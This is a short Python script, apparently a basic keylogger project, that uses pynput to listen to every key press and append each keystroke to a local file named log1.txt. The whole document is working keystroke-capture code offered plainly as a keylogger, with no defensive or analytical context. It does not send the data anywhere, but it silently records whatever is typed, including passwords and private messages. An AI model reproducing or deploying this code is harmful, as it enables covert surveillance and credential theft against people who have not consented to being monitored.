# Keylogger
#Basic key logger built with Python

from pynput.keyboard import Listener

def key_typed(key):
    alpha= str(key)
    alpha = alpha.replace("'","")

    if alpha== 'Key.space':
        alpha =' '

    with open('log1.txt','a') as a:
        a.write(alpha)

with Listener(on_press=key_typed) as s:
    s.join()
